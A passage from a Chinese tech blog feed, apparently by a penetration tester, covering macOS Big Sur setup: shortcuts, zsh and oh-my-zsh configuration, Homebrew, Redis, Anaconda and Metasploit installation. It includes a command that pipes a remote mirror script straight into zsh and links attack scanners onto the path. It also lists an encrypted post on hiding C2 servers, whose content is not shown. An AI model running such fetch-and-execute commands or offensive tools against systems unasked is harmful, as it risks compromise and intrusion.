<code>Z</code></td><td>撤销上一个命令。随后您可以按 Shift + Command + Z 来重做，从而反向执行撤销命令。在某些 App 中，您可以撤销和重做多个命令</td></tr><tr><td><code>Command</code> + <code>A</code></td><td>全选各项</td></tr><tr><td><code>Command</code> + <code>F</code></td><td>查找文稿中的项目或打开“查找”窗口</td></tr><tr><td><code>Command</code> + <code>G</code></td><td>再次查找：查找之前所找到项目出现的下一个位置。要查找出现的上一个位置，请按 Shift + Command + G</td></tr><tr><td><code>Command</code> + <code>H</code></td><td>隐藏最前面的 App 的窗口。要查看最前面的 App 但隐藏所有其他 App，请按 Option + Command + H</td></tr><tr><td><code>Command</code> + <code>M</code></td><td>将最前面的窗口最小化至“程序坞”。要最小化最前面的 App 的所有窗口，请按 Option + Command + M</td></tr><tr><td><code>Command</code> + <code>O</code></td><td>打开所选项，或打开一个对话框以选择要打开的文件</td></tr><tr><td><code>Command</code> + <code>P</code></td><td>打印当前文稿</td></tr><tr><td><code>Command</code> + <code>S</code></td><td>存储当前文稿</td></tr><tr><td><code>Command</code> + <code>T</code></td><td>打开新标签页</td></tr><tr><td><code>Command</code> + <code>W</code></td><td>关闭最前面的窗口。要关闭 App 的所有窗口，请按下 Option + Command + W</td></tr><tr><td><code>Option</code> + <code>Command</code> + <code>Esc</code></td><td>强制退出 App</td></tr><tr><td><code>Command</code> + <code>空格键</code></td><td>显示或隐藏“聚焦”搜索栏。要从“访达”窗口执行“聚焦”搜索，请按 Command + Option + 空格键。</td></tr><tr><td><code>Control</code> + <code>Command</code> + <code>空格键</code></td><td>显示字符检视器，您可以从中选择表情符号和其他符号</td></tr><tr><td><code>Control</code> + <code>Command</code> + <code>F</code></td><td>全屏使用 App（如果 App 支持）</td></tr><tr><td><code>空格键</code></td><td>使用快速查看来预览所选项</td></tr><tr><td><code>Command</code> + <code>Tab</code></td><td>在打开的 App 中切换到下一个最近使用的 App</td></tr><tr><td><code>Shift</code> + <code>Command</code> + <code>5</code></td><td>在 macOS Mojave 或更高版本中，拍摄截屏或录制屏幕。也可以使用 Shift + Command + 3 或 Shift + Command + 4 来拍摄截屏。</td></tr><tr><td><code>Shift</code> + <code>Command</code> + <code>N</code></td><td>在“访达”中创建一个新文件夹</td></tr><tr><td><code>Command</code> + <code>,</code> (逗号)</td><td>打开最前面的 App 的偏好设置</td></tr></tbody></table><hr><h1 id="—-软件-—"><a href="#—-软件-—" class="headerlink" title="— 软件 —"></a>— 软件 —</h1><blockquote><p><strong>核心生产力：<a href="https://macwk.com/">https://macwk.com/</a></strong></p></blockquote><h1 id="iTerm2"><a href="#iTerm2" class="headerlink" title="iTerm2"></a>iTerm2</h1><p>macOS 灵魂软件</p><p>配置效果：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511125327.png" alt="image-20210511125327640"></p><h2 id="Zsh"><a href="#Zsh" class="headerlink" title="Zsh"></a>Zsh</h2><p>zsh 是一款功能强大的 shell 软件，它可以兼容 bash，并且提供了很多高效的改进。它是Linux里最庞大的一种shell，它有84个内部命令，也提供了更为强大的功能:</p><ul><li>更好的自动补全</li><li>更好的文件名展开</li><li>丰富的插件</li><li>强大的定制性</li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .zshrc</span><br></pre></td></tr></table></figure><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">78 <span class="comment"># Which plugins would you like to load?</span></span><br><span class="line">79 <span class="comment"># Standard plugins can be found in $ZSH/plugins/</span></span><br><span class="line">80 <span class="comment"># Custom plugins may be added to $ZSH_CUSTOM/plugins/</span></span><br><span class="line">81 <span class="comment"># Example format: plugins=(rails git textmate ruby lighthouse)</span></span><br><span class="line">82 <span class="comment"># Add wisely, as too many plugins slow down shell startup.</span></span><br><span class="line">83 plugins=(</span><br><span class="line">84         git</span><br><span class="line">85         zsh-autosuggestions</span><br><span class="line">86         autojump</span><br><span class="line">87         zsh-syntax-highlighting</span><br><span class="line">88 )</span><br><span class="line">89</span><br><span class="line">90 [ -f /usr/<span class="built_in">local</span>/etc/profile.d/autojump.sh ] &amp;&amp; . /usr/<span class="built_in">local</span>/etc/profile.d/autojump.sh</span><br><span class="line">91 <span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br></pre></td></tr></table></figure><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ln -s /Users/lintstar/opt/anaconda3 /usr/<span class="built_in">local</span>/bin/anaconda</span><br><span class="line">ln -s /Users/lintstar/Library/Python/3.8/bin/virtualenv /usr/<span class="built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line">ln -s /Users/lintstar/Tools/attack/fscan/fscan /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ln -s /Users/lintstar/Tools/subfinder/subfinder /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ln -s /Users/lintstar/Tools/Attack/httpx/httpx /usr/<span class="built_in">local</span>/bin</span><br></pre></td></tr></table></figure><p><strong>刷新 Zsh</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh my zsh"></a>oh my zsh</h2><blockquote><p>由于 zsh 配置过于复杂，一般情况下，我们不会使用该 shell，直到「oh my zsh」的出现。</p></blockquote><p><a href="http://ohmyz.sh/">Oh My Zsh</a> 是一款社区驱动的命令行工具，正如它的主页上说的，Oh My Zsh 是一种生活方式。</p><p>它基于zsh命令行，提供了主题配置，插件机制，已经内置的便捷操作，给我们一种全新的方式使用命令行。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p><strong>在 .zshrc 中编辑</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">16 <span class="comment"># Path to your oh-my-zsh installation.</span></span><br><span class="line">17 <span class="built_in">export</span> ZSH=<span class="string">&quot;/Users/lintstar/.oh-my-zsh&quot;</span></span><br><span class="line">18</span><br><span class="line">19 <span class="comment"># Set name of the theme to load --- if set to &quot;random&quot;, it will</span></span><br><span class="line">20 <span class="comment"># load a random theme each time oh-my-zsh is loaded, in which case,</span></span><br><span class="line">21 <span class="comment"># to know which specific one was loaded, run: echo $RANDOM_THEME</span></span><br><span class="line">22 <span class="comment"># See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes</span></span><br><span class="line">23 ZSH_THEME=<span class="string">&quot;myys&quot;</span></span><br></pre></td></tr></table></figure><h3 id="myys-主题"><a href="#myys-主题" class="headerlink" title="myys 主题"></a>myys 主题</h3><p><strong>主题位置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~&#x2F;.oh-my-zsh&#x2F;themes</span><br></pre></td></tr></table></figure><p><strong>myys.zsh-theme</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">$ cat myys.zsh-theme</span><br><span class="line"><span class="comment"># Clean, simple, compatible and meaningful.</span></span><br><span class="line"><span class="comment"># Tested on Linux, Unix and Windows under ANSI colors.</span></span><br><span class="line"><span class="comment"># It is recommended to use with a dark background.</span></span><br><span class="line"><span class="comment"># Colors: black, red, green, yellow, *blue, magenta, cyan, and white.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Mar 2013 Yad Smood</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># VCS</span></span><br><span class="line">YS_VCS_PROMPT_PREFIX1=<span class="string">&quot; %&#123;<span class="variable">$fg</span>[white]%&#125;on%&#123;<span class="variable">$reset_color</span>%&#125; &quot;</span></span><br><span class="line">YS_VCS_PROMPT_PREFIX2=<span class="string">&quot;:%&#123;<span class="variable">$fg</span>[cyan]%&#125;&quot;</span></span><br><span class="line">YS_VCS_PROMPT_SUFFIX=<span class="string">&quot;%&#123;<span class="variable">$reset_color</span>%&#125;&quot;</span></span><br><span class="line">YS_VCS_PROMPT_DIRTY=<span class="string">&quot; %&#123;<span class="variable">$fg</span>[red]%&#125;x&quot;</span></span><br><span class="line">YS_VCS_PROMPT_CLEAN=<span class="string">&quot; %&#123;<span class="variable">$fg</span>[green]%&#125;o&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Git info</span></span><br><span class="line"><span class="built_in">local</span> git_info=<span class="string">&#x27;$(git_prompt_info)&#x27;</span></span><br><span class="line">ZSH_THEME_GIT_PROMPT_PREFIX=<span class="string">&quot;<span class="variable">$&#123;YS_VCS_PROMPT_PREFIX1&#125;</span>git<span class="variable">$&#123;YS_VCS_PROMPT_PREFIX2&#125;</span>&quot;</span></span><br><span class="line">ZSH_THEME_GIT_PROMPT_SUFFIX=<span class="string">&quot;<span class="variable">$YS_VCS_PROMPT_SUFFIX</span>&quot;</span></span><br><span class="line">ZSH_THEME_GIT_PROMPT_DIRTY=<span class="string">&quot;<span class="variable">$YS_VCS_PROMPT_DIRTY</span>&quot;</span></span><br><span class="line">ZSH_THEME_GIT_PROMPT_CLEAN=<span class="string">&quot;<span class="variable">$YS_VCS_PROMPT_CLEAN</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HG info</span></span><br><span class="line"><span class="built_in">local</span> hg_info=<span class="string">&#x27;$(ys_hg_prompt_info)&#x27;</span></span><br><span class="line"><span class="function"><span class="title">ys_hg_prompt_info</span></span>() &#123;</span><br><span class="line"><span class="comment"># make sure this is a hg dir</span></span><br><span class="line"><span class="keyword">if</span> [ -d <span class="string">&#x27;.hg&#x27;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$&#123;YS_VCS_PROMPT_PREFIX1&#125;</span>hg<span class="variable">$&#123;YS_VCS_PROMPT_PREFIX2&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -n $(hg branch 2&gt;/dev/null)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="subst">$(hg status 2&gt;/dev/null)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$YS_VCS_PROMPT_DIRTY</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$YS_VCS_PROMPT_CLEAN</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$YS_VCS_PROMPT_SUFFIX</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> exit_code=<span class="string">&quot;%(?,,C:%&#123;<span class="variable">$fg</span>[red]%&#125;%?%&#123;<span class="variable">$reset_color</span>%&#125;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prompt format:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># PRIVILEGES USER @ MACHINE in DIRECTORY on git:BRANCH STATE [TIME] C:LAST_EXIT_CODE</span></span><br><span class="line"><span class="comment"># $ COMMAND</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For example:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># % ys @ ys-mbp in ~/.oh-my-zsh on git:master x [21:47:42] C:0</span></span><br><span class="line"><span class="comment"># $</span></span><br><span class="line">PROMPT=<span class="string">&quot;</span></span><br><span class="line"><span class="string">%&#123;<span class="variable">$terminfo</span>[bold]<span class="variable">$fg</span>[blue]%&#125;#%&#123;<span class="variable">$reset_color</span>%&#125; \</span></span><br><span class="line"><span class="string">%(#,%&#123;<span class="variable">$bg</span>[yellow]%&#125;%&#123;<span class="variable">$fg</span>[black]%&#125;%n%&#123;<span class="variable">$reset_color</span>%&#125;,%&#123;<span class="variable">$fg</span>[cyan]%&#125;%n) \</span></span><br><span class="line"><span class="string">%&#123;<span class="variable">$fg</span>[white]%&#125;from \</span></span><br><span class="line"><span class="string">%&#123;<span class="variable">$terminfo</span>[bold]<span class="variable">$fg</span>[yellow]%&#125;%~%&#123;<span class="variable">$reset_color</span>%&#125;\</span></span><br><span class="line"><span class="string"><span class="variable">$&#123;hg_info&#125;</span>\</span></span><br><span class="line"><span class="string"><span class="variable">$&#123;git_info&#125;</span>\</span></span><br><span class="line"><span class="string"> \</span></span><br><span class="line"><span class="string">%&#123;<span class="variable">$fg</span>[white]%&#125;[%*] <span class="variable">$exit_code</span></span></span><br><span class="line"><span class="string">%&#123;<span class="variable">$terminfo</span>[bold]<span class="variable">$fg</span>[red]%&#125;$ %&#123;<span class="variable">$reset_color</span>%&#125;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="超级右键"><a href="#超级右键" class="headerlink" title="超级右键"></a>超级右键</h1><p>右键进入 iTerm2 的巴适懂得都懂</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210415012644.png" alt="image-20210415012644180"></p><h1 id="Bob"><a href="#Bob" class="headerlink" title="Bob"></a>Bob</h1><p>翻译功能 Command+d 就不说了</p><p>重点是截图翻译可以用来当作文字识别使用 </p><p>在一些不能复制粘贴的地方还是很方便的</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511122258.png" alt="image-20210511122258953"></p><p>配置好 API 即可 （百度翻译体验很好而且免费~）</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511121651.png" alt="image-20210511121651216"></p><h1 id="HiddenBar"><a href="#HiddenBar" class="headerlink" title="HiddenBar"></a>HiddenBar</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511122723.png" alt="image-20210511122723692"></p><blockquote><p>在 | 和 &gt; 中间可以用Command 拖入需要一直显示但是很占地方的菜单栏 例如 QQ 音乐</p></blockquote><p><strong>实际效果</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511122657.png" alt="image-20210511122657500"></p><h1 id="Image2icon"><a href="#Image2icon" class="headerlink" title="Image2icon"></a>Image2icon</h1><p>自己封装 APP 时候制作图标神器</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511123425.png" alt="image-20210511123425488"></p><p>配合<strong>自动操作</strong>体验极好：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511123646.png" alt="image-20210511123646022"></p><h1 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h1><h2 id="Suspicious-Site-Reporter"><a href="#Suspicious-Site-Reporter" class="headerlink" title="Suspicious Site Reporter"></a>Suspicious Site Reporter</h2><p>Chrome 官方插件 可以显示 https 还是 http 方便粘贴 URL</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511113810.png" alt="image-20210511113810266"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h1><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><h3 id="Chinese-Simplified-Language-Pack-中文语言包"><a href="#Chinese-Simplified-Language-Pack-中文语言包" class="headerlink" title="Chinese (Simplified )Language Pack/ 中文语言包"></a>Chinese (Simplified )Language Pack/ 中文语言包</h3><p>添加中文作为 IDE 界面语言。</p><h3 id="Material-Theme-U"><a href="#Material-Theme-U" class="headerlink" title="Material Theme U"></a>Material Theme U</h3><p>主题插件看个人喜好 ~</p><h3 id="Ideavim"><a href="#Ideavim" class="headerlink" title="Ideavim"></a>Ideavim</h3><p>像 VIM 一样编辑代码。</p><h3 id="Nyan-Progress-Bar"><a href="#Nyan-Progress-Bar" class="headerlink" title="Nyan Progress Bar"></a>Nyan Progress Bar</h3><p>基于LJ的ide的nyan cat的retty进度条：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210511115657.png" alt="image-20210511115657423"></p><h2 id="Mac-Pycharm-空间或内存不够"><a href="#Mac-Pycharm-空间或内存不够" class="headerlink" title="Mac Pycharm 空间或内存不够"></a>Mac Pycharm 空间或内存不够</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210415030649.png" alt="image-20210415030649132"></p><hr><h1 id="—环境—"><a href="#—环境—" class="headerlink" title="—环境—"></a>—环境—</h1><h1 id="HomeBrew"><a href="#HomeBrew" class="headerlink" title="HomeBrew"></a>HomeBrew</h1><p>Homebrew 是安装 Apple 不包含在 macOS 中的 UNIX 工具的最简单，最灵活的方法。它还可以将不需要 Linux 发行包打包的软件安装到主目录，而无需安装 <code>sudo</code>。</p><blockquote><p><strong>HomeBrew 已经支持 BigSur！划重点</strong></p></blockquote><h2 id="安装脚本"><a href="#安装脚本" class="headerlink" title="安装脚本"></a>安装脚本</h2><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/zsh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><h2 id="自检命令"><a href="#自检命令" class="headerlink" title="自检命令"></a>自检命令</h2><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/bin/brew doctor</span><br></pre></td></tr></table></figure><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew install smartmontools</span><br><span class="line"></span><br><span class="line">smartctl -a disk0</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://zhuanlan.zhihu.com/p/111014448">https://zhuanlan.zhihu.com/p/111014448</a></p></blockquote><h2 id="卸载重新安装"><a href="#卸载重新安装" class="headerlink" title="卸载重新安装"></a>卸载重新安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew uninstall --force node &amp;&amp; brew install node</span><br></pre></td></tr></table></figure><h2 id="Download-failed-问题"><a href="#Download-failed-问题" class="headerlink" title="Download failed 问题"></a>Download failed 问题</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210412043224.png"></p><p>这个报错怎么查都解决不了，查了一万种方法，甚至重装了 brew   </p><p>后面断掉公司网：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210412043447.png" alt="image-20210412043447403"></p><p>！！！！！！！！！！！！</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><ol><li><strong>更换网络尝试</strong></li><li><strong>brew update 后再次尝试</strong></li></ol><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p><strong>1. 安装命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install redis</span><br></pre></td></tr></table></figure><p><strong>2. 进入安装目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/Cellar/redis/4.0.6/bin</span><br></pre></td></tr></table></figure><p><strong>3. 启动、关闭redis</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ redis-server</span><br></pre></td></tr></table></figure><p> 以下命令即可关闭redis服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; SHUTDOWN</span><br></pre></td></tr></table></figure><p><strong>4. 连接redis服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h  127.0.0.1（ip） -p 1234（端口号）</span><br></pre></td></tr></table></figure><p><strong>5. 键入授权登录密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH 123456（密码）</span><br></pre></td></tr></table></figure><p><strong>6. 退出本次会话</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; quit</span><br></pre></td></tr></table></figure><h1 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ conda env list</span><br><span class="line"><span class="comment"># conda environments:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">base                  *  /Users/lintstar/opt/anaconda3</span><br></pre></td></tr></table></figure><p>查看当前配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda info </span><br></pre></td></tr></table></figure><p><strong>mac 安装了conda后，前面会有一个(base)</strong></p><blockquote><p>安装conda后，每次启动终端，都会自动启动conda的base环境，conda的环境可以用 conda env list 查看</p></blockquote><p><strong>解决办法：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --<span class="built_in">set</span> auto_activate_base <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/108506007">https://zhuanlan.zhihu.com/p/108506007</a></li></ul><h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>最新版下载地址：<a href="https://osx.metasploit.com/metasploitframework-latest.pkg">https://osx.metasploit.com/metasploitframework-latest.pkg</a></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210526111056.png" alt="image-20210526111056496"></p><h2 id="Zsh-软链接"><a href="#Zsh-软链接" class="headerlink" title="Zsh 软链接"></a>Zsh 软链接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p>添加一条软链接记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:/opt/metasploit-framework/bin&quot;</span></span><br></pre></td></tr></table></figure><p>刷新 Zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsh</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><strong>初始化数据库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/metasploit-framework/bin</span><br><span class="line">./msfdb init</span><br></pre></td></tr></table></figure><p><strong>运行 MSF</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><blockquote><p>启动账号密码设置 msf/msf</p></blockquote><p><strong>可能出现某个模块加载失败：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210526113619.png" alt="image-20210526113619529"></p><p><strong>解决办法：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open /opt/metasploit-framework/embedded/framework/modules/auxiliary/gather</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210526113700.png" alt="image-20210526113700779"></p><p><strong>修改后即可正常启动：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210526113759.png" alt="image-20210526113759574"></p><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/metasploit-framework/bin</span><br><span class="line">sudo ./msfremove</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;作为近几年以来变化最大的 macOS 更新，macOS Big Sur 对内置应用的图标、应用的设计语言、桌面的程序坞和菜单栏等方面都进行了重新设计，拟物化的风格深得人心。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;虽说 “BugSur” 的名号不是白</summary>
      
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="Mac" scheme="https://www.lintstar.top/tags/Mac/"/>
    
    <category term="BigSur" scheme="https://www.lintstar.top/tags/BigSur/"/>
    
    <category term="Environment" scheme="https://www.lintstar.top/tags/Environment/"/>
    
  </entry>
  
  <entry>
    <title>隐藏 C2的几种方式</title>
    <link href="https://www.lintstar.top/2021/03/7b4f6af8.html"/>
    <id>https://www.lintstar.top/2021/03/7b4f6af8.html</id>
    <published>2021-03-28T15:49:59.000Z</published>
    <updated>2021-05-10T18:14:52.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">本文已加密 <br>隐藏加速你的 C2<br></label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="248d5fe71ca6758ab68b1bdfb35c334f38113cb44d7b18bcbfc116524c6e9c30"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="Python" scheme="https://www.lintstar.top/tags/Python/"/>
    
    <category term="CobaltStrike" scheme="https://www.lintstar.top/tags/CobaltStrike/"/>
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Serverless" scheme="https://www.lintstar.top/tags/Serverless/"/>
    
  </entry>
  
  <entry>
    <title>Crawlergo动态爬虫联动Xray</title>
    <link href="https://www.lintstar.top/2021/03/33b41b9d.html"/>
    <id>https://www.lintstar.top/2021/03/33b41b9d.html</id>
    <published>2021-03-10T15:49:59.000Z</published>
